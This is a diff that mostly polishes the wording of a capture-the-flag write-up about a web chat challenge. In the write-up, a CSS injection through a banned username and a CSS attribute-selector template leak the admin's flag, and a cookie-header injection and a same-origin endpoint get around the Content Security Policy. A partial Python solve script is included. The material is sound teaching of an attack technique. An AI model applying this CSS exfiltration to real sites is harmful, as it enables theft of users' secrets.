@@ -4,7 +4,7 @@ In the task we get access to a web-based chat application.
 We automatically join a random channel, and we can use the link with room number to invite more people to the chat.
 The whole chat is implemented in javascript and apart from [client code](client.js) we also get [server code](server.js).
 
-The chat, apart from obvious message sending function, has also some special commands:
+The chat, besides the obvious message sending function, has also some special commands:
 
 - `/name YourNewName` - Change your nick name to YourNewName.
 - `/report` - Report dog talk to the admin.
@@ -16,7 +16,7 @@ And if we look into the source code we get also information on admin commands:
 
 If we use `/report` command admin comes to the chat, and leaves after a moment.
 If any of the users meanwhile says `dog`, this user will get banned.
-Ban is only client-side, managed by a cookie, so we can un-ban the user by simply removing the cookie.
+Ban is implemented only client-side, managed by a cookie, so we can un-ban our user simply by removing the cookie.
 
 From the sources the first important part is the location of the flag, visible in the source code of the server code for handling `/secret` command:
 
@@ -27,11 +27,11 @@ From the sources the first important part is the location of the flag, visible i
         response = {type: 'secret'};
 ```
 
-If someone issues this command, then server sends a cookie `flag` with designated value.
+If someone issues this command, then server sends a cookie `flag` with a designated value.
 From the description of the command we can guess that admin already has this cookie set, so our goal is to steal the cookie.
-We notice here that there is a way to add more parameters to the cookie header, so theoretically we could set secret with value `; Path=/whatever;` and thus overwrite the original intended cookie Path parameter.
+We notice here that there is a injection that allows us to add more parameters to the cookie header, so theoretically we could set secret with value `; Path=/whatever;` and thus overwrite the original intended cookie Path parameter.
 This is useful, because it means we could use `/secret something; domain=gooe.com` to avoid setting a new cookie, so we won't overwrite the original flag someone might have stored in the cookie.
-Stealing cookie would seem like a classic XSS task, however if we check `Content Security Policy` we can see that the whole application has:
+Stealing cookie would seem like a classic XSS task, however if we check the `Content Security Policy` header we can see that the whole application has:
 
 ```
 default-src 'self'; 
@@ -40,8 +40,8 @@ script-src 'self' https://www.google.com/recaptcha/ https://www.gstatic.com/reca
 frame-src 'self' https://www.google.com/recaptcha/
 ```
 
-So there is no way we can run any javascript there.
-However, we can notice that there is a chance to load a CSS from inline.
+So there is no way we can run any javascript there without a reflected xss somewhere on the website.
+However, we can notice that there is a chance to load a inline CSS.
 
 But once we analyse the client code, we notice that the cookie is not the only place where the flag might be present.
 In the client-side handler for server messages we can see:
@@ -50,7 +50,7 @@ In the client-side handler for server messages we can see:
 secret(data) { display(`Successfully changed secret to <span data-secret="${esc(cookie('flag'))}">*****</span>`); },
 ```
 
-So once `/secret` command is issued, the server responds with `secret` message, and client will show a `span` with flag in it.
+So if a `/secret` command is issued, the server responds with `secret` message, and client will show a `span` with flag in it.
 Moreover, the flag is actually value of attribute `data-secret` of tag `span`.
 We've written already a bit about exfiltrating data from html tags attributes via CSS in https://github.com/p4-team/ctf/tree/master/2018-01-20-insomnihack/web_css and here we have a very similar case.
 
@@ -62,10 +62,10 @@ span[data-secret^={letter} i]{{background: url({some_url}?msg={letter})}}
 
 Every user for whom this style is applied, would make a request on URL we provide, assuming the secret data match the letter we selected.
 In our case we can't use just any URL, because CSP will not allow sending the request "outside", but fortunately we can use url `/room/{room_id}/send?name=leaker&msg={letter}` and the data will appear as message on the chat in the room we select.
-We can make a lot of those style entries, one for each letter, and thus recover the first letter of the secret.
+We can make a lot of those style entries, one for each letter of the flags charset, and thus recover the first letter of the secret.
 Then we can simply match two letters, then three etc.
 
-Now we're left with two problems:
+We're now left with two problems:
 - We have to find a way to inject the CSS on the page
 - We have to find a way to convince admin to issue `/secret` command.
 
@@ -83,7 +83,7 @@ Solution to the first problem can be found in the code handling banned users:
     }
 ```
 
-If we look closely at the `else` case, we notice that DOM of the page will get extended with `<style>span[data-name^=${esc(data.name)}] { color: red; }</style>`, and we control the `data.name` parameter, since it's the username of banned user.
+If we look closely at the `else` case, we can notice that DOM of the page will get extended with `<style>span[data-name^=${esc(data.name)}] { color: red; }</style>`, and we control the `data.name` parameter, since it's the username of banned user.
 
 We can, therefore, use a name which closes the opening style tags and adds new ones, for example:
 
@@ -190,7 +190,6 @@ def main():
     flag_payload += 'span[data-name^=whatever'
     captcha = raw_input('captcha code:')
     r = get(URL + 'send', params={'name': 'bzorp', 'msg': '/report %s' % captcha}, headers={'Referer': URL})
-    print(r.content)
     time.sleep(1)
     cookier = session()
     cookier.get(URL)
@@ -204,4 +203,4 @@ def main():
 main()
 ```
 
-Running this mutiple times, expanding the flag prefix each time gives us: `CTF{L0LC47S_43V3}`
+Running this mutiple times, expanding the flag prefix each time gives us: `CTF{L0LC47S_43V3R}`
